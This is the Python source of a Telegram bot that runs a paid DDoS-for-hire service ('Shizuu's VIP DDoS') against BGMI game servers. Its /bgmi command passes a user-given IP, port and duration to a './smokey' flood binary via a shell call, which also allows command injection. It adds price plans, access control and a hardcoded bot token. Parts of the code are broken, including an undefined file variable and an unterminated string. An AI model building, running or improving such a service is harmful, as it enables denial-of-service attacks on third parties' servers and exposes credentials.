
import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7654155864:AAFAOWRPVFCeszMarggRCuTE43_1DokgNFk')

# Admin user IDs
admin_id = {"6146319732", "5666606072"}
USER_FILE = "users1.txt"
LOG_FILE = "log1.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

def log_command(user_id, ip, port, time):
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"

    log_entry = f"""Username: {username}
IP: {ip}
Port: {port}
Duration: {time} seconds

"""
    with open(LOG_FILE, "a") as file:
        file.write(log_entry)

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, ip=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if ip:
        log_entry += f" | ip: {ip}"
    if port:
        log_entry += f" | port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only admins can use this command 🤡"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "Only admins can use this command 🤡"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "Only admins can use this command 🤡"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "Only admins can use this command 🤡"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "Only admins can use this command 🤡"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

def start_attack_reply(message, ip, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗 🚀🎮\n\n🎯𝙸𝙿 : {ip}\n🎮𝙿𝙾𝚁𝚃 : {port}\n🕰️𝙳𝚄𝚁𝙰𝚃𝙸𝙾𝙽 : {time}s\n⛏️𝙼𝙴𝚃𝙷𝙾𝙳 : 𝗦𝗵𝗶𝘇𝘂𝘂 𝗩𝗜𝗣 𝗗𝗗𝗼𝗦 🤖\n\n❌ 𝗞𝗜𝗡𝗗𝗟𝗬 𝗥𝗘𝗙𝗥𝗔𝗜𝗡 𝗙𝗥𝗢𝗠 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚 𝗔𝗡𝗢𝗧𝗛𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗪𝗛𝗜𝗟𝗘 𝗢𝗡𝗘 𝗜𝗦 𝗢𝗡 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 ( even if other person is attacking ). ⚠️"
    bot.reply_to(message, response)

bgmi_cooldown = {}

COOLDOWN_TIME =10

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 10sec Before Running The /bgmi Command Again ."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            ip = command[1]
            port = int(command[2])  
            time = int(command[3])  
            if time > 301:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi_compiled', ip, port, time)
                log_command(user_id, ip, port, time)
                start_attack_reply(message, ip, port, time)  
                full_command = f"./smokey {ip} {port} {time} 1200"
                subprocess.run(full_command, shell=True)
                response = f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 🚀\n\n𝗬𝗢𝗨 𝗖𝗔𝗡 𝗦𝗧𝗔𝗥𝗧 𝗔𝗡𝗢𝗧𝗛𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗢𝗪⚠️""
        else:
            response = "✅ Currently Available: /bgmi <ip> <port> <time>"  
    else:
        response = "Contact admin to get access 🥀🙏🏿."

    bot.reply_to(message, response)


@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Only Admins can run that motherfucker"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''╔════════════════════╗
       ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ
╚════════════════════╝

🛠 ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs:

✅ /start - Show bot info
✅ /rules - Show the bot rules ( must use )
✅ /bgmi [ip] [port] [time] - Start attack
✅ /mylogs - Show your activity
✅ /plan - Show payment plans

🔐 ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:

🔒 /add [id] - Add user
🔒 /remove [id] - Remove user
🔒 /allusers - List users
🔒 /clearlogs - Clear logs

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🚀 Welcome to Shizuu's VIP DDoS service {user_name}! 🔥

🎮 Enhance Your Gaming Experience By Dominating BGMI server 💫
🔹 For Any Issue, Feel free to contact the bot admin ✅  

🤖 Need help? Use: /help  
"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

🎮 Dont Run Too Many Attacks !! Cause A Ban From Bot
🎮 Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot ( even if other person is attacking )
🎮. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 🎯彡[ʙʀᴏ ᴏɴʟʏ 1 ᴘʟᴀɴ ɪꜱ ᴘᴏᴡᴇʀꜰᴜʟʟ ᴛʜᴇɴ ᴀɴʏ ᴏᴛʜᴇʀ ᴅᴅᴏꜱ]彡🎯 !!:

🎮 PRICE LIST FOR PAID PLAN 🤖

💸1 DAY - 50₹/-
💸1 WEEK - 400₹/-
💸1 MONTH - 999₹/-

PAID PLAN IS MORE POWERFULL AND INCREASED TIME 🔥
Contact admin for more details 🎯
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ IMPORTANT MESSAGE FROM OWNER:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only admins can run that command"

    bot.reply_to(message, response)




while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
